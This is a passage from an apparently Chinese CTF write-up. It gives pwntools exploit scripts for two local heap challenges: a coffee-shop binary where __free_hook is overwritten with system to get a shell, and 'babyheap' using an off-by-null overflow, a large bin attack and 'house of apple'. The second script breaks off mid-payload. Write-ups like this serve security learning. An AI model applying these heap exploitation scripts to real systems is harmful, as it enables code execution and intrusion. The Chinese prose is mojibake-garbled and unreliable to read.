</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sa</span>(delim, data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>sendafter(delim, data)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sla</span>(delim, data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>sendlineafter(delim, data)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">ru</span>(delim, drop<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recvuntil(delim, drop)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">itr</span>(): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>interactive()
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">lg</span>(name): <span style="color:#ff79c6">return</span> log<span style="color:#ff79c6">.</span>success(
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> ==&gt; 0x</span><span style="color:#f1fa8c">%x</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#39;</span> <span style="color:#ff79c6">%</span> (name, <span style="color:#8be9fd;font-style:italic">eval</span>(name)))
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">uu64</span>(): <span style="color:#ff79c6">return</span> u64(p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x7f</span><span style="color:#f1fa8c">&#34;</span>)[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">6</span>:]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">itob</span>(num): <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">str</span>(num)<span style="color:#ff79c6">.</span>encode()
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">dbg</span>(p): gdb<span style="color:#ff79c6">.</span>attach(p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;pwn_patched&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#ff79c6">=</span> ELF(file, checksec<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>libc
</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> elf
</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;INFO&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>terminal <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;tmux&#39;</span>, <span style="color:#f1fa8c">&#39;splitw&#39;</span>, <span style="color:#f1fa8c">&#39;-h&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">menu</span>(cmd):
</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt;&gt;&#34;</span>, itob(cmd))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">buy</span>(idx, con <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>):
</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input the id of what coffee you want to buy&#34;</span>, itob(idx))
</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Do you want to add something?Y/N&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Y&#34;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Ok,please input what you need in coffee&#34;</span>, con)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">show</span>():
</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">admin</span>():
</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">0x1145</span>)
</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;please input the admin password&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;just pwn it&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">quit_admin</span>():
</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">3</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">replenish</span>(<span style="color:#8be9fd;font-style:italic">id</span>):
</span></span><span style="display:flex;"><span>    admin()
</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt;&gt;&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span>)
</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input the id you want to replenish&#34;</span>, itob(<span style="color:#8be9fd;font-style:italic">id</span>))
</span></span><span style="display:flex;"><span>    quit_admin()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">change_default</span>(<span style="color:#8be9fd;font-style:italic">id</span>, pos, con):
</span></span><span style="display:flex;"><span>    admin()
</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt;&gt;&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;2&#34;</span>)
</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input the id you want to change&#34;</span>, itob(<span style="color:#8be9fd;font-style:italic">id</span>))
</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input which coffee you want to change&#34;</span>, itob(pos))
</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input your content&#34;</span>, con)
</span></span><span style="display:flex;"><span>    quit_admin()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>free_got <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>got<span style="color:#ff79c6">.</span>free
</span></span><span style="display:flex;"><span>cofflist <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4062F0</span>
</span></span><span style="display:flex;"><span>stderr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4062e0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">3</span>):
</span></span><span style="display:flex;"><span>    buy(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buy(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>change_default(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">4</span>, p64(cofflist))
</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>change_default(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">2</span>, p64(stderr))
</span></span><span style="display:flex;"><span>show()
</span></span><span style="display:flex;"><span>leak <span style="color:#ff79c6">=</span> uu64()
</span></span><span style="display:flex;"><span>libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x1ed5c0</span>
</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#39;libc.address&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">3</span>):
</span></span><span style="display:flex;"><span>    buy(<span style="color:#bd93f9">3</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buy(<span style="color:#bd93f9">3</span>)
</span></span><span style="display:flex;"><span>change_default(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">4</span>, p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>__free_hook))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">3</span>)
</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">3</span>)
</span></span><span style="display:flex;"><span>change_default(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">2</span>, p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>system))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buy(<span style="color:#bd93f9">3</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># dbg(p)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>itr()
</span></span></code></pre></div><h2 id="babyheap">babyheap</h2>
<p>å‡ºé¢˜äººå¾ˆå¥½å¿ƒçš„ç»™å‡ºäº†ä¸€ä¸ªå †åœ°å€ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨å †åˆå¹¶æ—¶ï¼Œç»•è¿‡unlink_chunkçš„assert</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (__builtin_expect(fd<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">!=</span> p <span style="color:#ff79c6">||</span> bk<span style="color:#ff79c6">-&gt;</span>fd <span style="color:#ff79c6">!=</span> p, <span style="color:#bd93f9">0</span>))
</span></span></code></pre></div><p>é—®é¢˜å‡ºç°åœ¨ è¯»å–æ•°æ®ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªå †æº¢å‡ºå†™0</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">read_con</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>ptr, <span style="color:#8be9fd">int</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buf; <span style="color:#6272a4">// [rsp+13h] [rbp-Dh] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+14h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v5; <span style="color:#6272a4">// [rsp+18h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  v5 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> a2; <span style="color:#ff79c6">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    read(<span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">&amp;</span>buf, <span style="color:#bd93f9">1uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( buf <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">10</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
</span></span><span style="display:flex;"><span>    ptr[i] <span style="color:#ff79c6">=</span> buf;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ptr[i] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> v5 <span style="color:#ff79c6">-</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>æˆ‘ä»¬sizeçš„é™åˆ¶ï¼Œè¿™ä¸ªå¤§å°çš„binä¸º tcache, unsorted, large bin</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>size <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x3FF</span> <span style="color:#ff79c6">&amp;&amp;</span> size <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0x500</span>
</span></span></code></pre></div><p>æ³„éœ²å‡ºåœ°å€ï¼Œ<code>large bin attack</code>ï¼Œä½¿ç”¨house of apple æ‰‹æ®µã€‚</p>
<ul>
<li>a-b-cï¼Œåœ¨aä¼ªé€ ä¸€ä¸ªå †ï¼Œä½†æ˜¯å› ä¸ºä½¿ç”¨putså‡½æ•°è¿›è¡Œshowï¼Œä½†æ˜¯ä¼šå­˜åœ¨<code>\x00</code> æˆªæ–­é—®é¢˜ï¼Œå¯ä»¥å°†aä¼ªé€ æˆä¸€ä¸ª free_chunkï¼Œå¹¶ä¸”ä¼šå› ä¸ºarenaåœ°å€æ— æ³•leakæˆåŠŸã€‚å› æ­¤éœ€è¦å †é£æ°´ä¸€ä¸‹ï¼Œè®©large bin arenaæœ€åä¸€å­—èŠ‚ä¸ä¸º0ã€‚</li>
<li>free b, a-b åˆå¹¶ï¼Œmalloc d, a &amp; dæŒ‡å‘åŒä¸€ä¸ªchunkï¼Œå°±å¯ä»¥æœ‰ç±»ä¼¼uafçš„æ•ˆæœã€‚</li>
<li>large bin attack çš„æ‰‹æ®µï¼š free a, aæ”¾å…¥largebin é‡Œï¼Œåˆ©ç”¨dä¿®æ”¹açš„ <code>bk_nextsize</code> ä¸º  <code>io_list_all-0x20</code> ï¼Œé‡Šæ”¾ä¸€ä¸ªæ¯”<code>a</code> sizeå°çš„chunk <code>e</code>ï¼Œå°†<code>e</code>æ”¾å…¥large biné‡Œã€‚è¿™æ · <code>io_list_all =&gt; heap a</code></li>
<li>house_of_appleï¼šåˆ©ç”¨dä¿®æ”¹aå†…å®¹ï¼Œä¼ªé€ ä¸€ä¸ª<code>fake_io</code></li>
<li>é€€å‡ºï¼ŒIOæµï¼Œå¹¶ä¸”æ­¤é¢˜æ²¡æœ‰æ²™ç®±</li>
</ul>
<p>house of apple çš„expå¦‚ä¸‹</p>
<ul>
<li>ä½†æ˜¯è¿™æ˜¯åœ¨æˆ‘kaliçš„glibc 2.37 ä¸‹è¿›è¡Œçš„ï¼Œåœ¨libc2.38 patchåä¼šå› ä¸ºarenaæœ€åä¸€ä¸ªå­—èŠ‚ä¸º0è€Œæ— æ³•æˆåŠŸï¼ŒğŸ˜«ï¼Œä¸æƒ³é£æ°´äº†</li>
<li>æœ€åå‡‘ä¸€ä¸ª <code>rdi/flag</code> ã€‚</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">s</span>(data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>send(data)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sa</span>(delim, data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>sendafter(delim, data)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sl</span>(data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>sendline(data)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sla</span>(delim, data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>sendlineafter(delim, data)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">r</span>(num<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4096</span>): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recv(num)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">ru</span>(delim, drop<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recvuntil(delim, drop)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">rl</span>(): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recvline(timeout<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">itr</span>(): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>interactive()
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">lg</span>(name): <span style="color:#ff79c6">return</span> log<span style="color:#ff79c6">.</span>success(
</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> ==&gt; 0x</span><span style="color:#f1fa8c">%x</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#39;</span> <span style="color:#ff79c6">%</span> (name, <span style="color:#8be9fd;font-style:italic">eval</span>(name)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">uu64</span>(): <span style="color:#ff79c6">return</span> u64(p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x7f</span><span style="color:#f1fa8c">&#34;</span>)[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">6</span>:]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">itob</span>(num): <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">str</span>(num)<span style="color:#ff79c6">.</span>encode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">dbg</span>(p):
</span></span><span style="display:flex;"><span>    gdb<span style="color:#ff79c6">.</span>attach(p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;babyheap&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#ff79c6">=</span> ELF(file, checksec<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>libc
</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> elf
</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;DEBUG&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>terminal <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;tmux&#39;</span>, <span style="color:#f1fa8c">&#39;splitw&#39;</span>, <span style="color:#f1fa8c">&#39;-h&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">menu</span>(cmd):
</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt;&#34;</span>, itob(cmd))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">add</span>(sz, con):
</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input your name size&#34;</span>, itob(sz))
</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input your name&#34;</span>, con)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">edit</span>(idx, sz, con):
</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">2</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input index&#34;</span>, itob(idx))
</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input your name size&#34;</span>, itob(sz))
</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input your name&#34;</span>, con)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">show</span>(idx):
</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">3</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input index&#34;</span>, itob(idx))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">delete</span>(idx):
</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">4</span>)
</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input index&#34;</span>, itob(idx))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ru(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;0x&#34;</span>)
</span></span><span style="display:flex;"><span>heap_addr <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(r(<span style="color:#bd93f9">12</span>),<span style="color:#bd93f9">16</span>)
</span></span><span style="display:flex;"><span>heap_base <span style="color:#ff79c6">=</span> heap_addr <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2a0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x418</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 1</span>
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 2</span>
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x418</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x428</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 4</span>
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>) <span style="color:#6272a4"># 5</span>
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x448</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 6</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> fit({
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x0</span>: heap_base<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x2b0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x500</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x8</span>: heap_base<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x2b0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x500</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x410</span>: <span style="color:#bd93f9">0x420</span>
</span></span><span style="display:flex;"><span>}, filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0x418</span>, payload)
</span></span><span style="display:flex;"><span>delete(<span style="color:#bd93f9">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>show(<span style="color:#bd93f9">1</span>)
</span></span><span style="display:flex;"><span>leak <span style="color:#ff79c6">=</span> uu64()
</span></span><span style="display:flex;"><span>libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x1d3ce0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x418</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 2</span>
</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 7</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> fit({
